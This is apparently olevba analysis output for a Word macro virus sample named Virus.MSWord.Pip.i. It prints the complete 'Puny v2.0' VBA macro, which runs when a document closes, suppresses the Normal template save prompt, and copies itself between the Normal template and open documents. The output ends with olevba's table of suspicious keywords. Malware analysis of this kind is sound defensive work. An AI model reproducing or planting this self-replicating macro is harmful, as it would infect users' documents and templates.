olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pip.i-574cddaf925e13c8892bdec83bfc060e2875f942
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pip.i-574cddaf925e13c8892bdec83bfc060e2875f942 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Puny.bas 
in file: Virus.MSWord.Pip.i-574cddaf925e13c8892bdec83bfc060e2875f942 - OLE stream: 'Macros/VBA/Puny'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    'Puny v2.0 WalruS
    On Error Resume Next
    Options.SaveNormalPrompt = False
    Set N = NormalTemplate.VBProject.VBComponents: Set D = ActiveDocument.VBProject.VBComponents: P = "C:\P"
If N.Item("Puny").Name <> "Puny" Then
    D("Puny").Export P: Set i = NormalTemplate.VBProject
ElseIf D.Item("Puny").Name <> "Puny" Then
    N("Puny").Export P: Set i = ActiveDocument.VBProject
End If
i.VBComponents.Import P
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

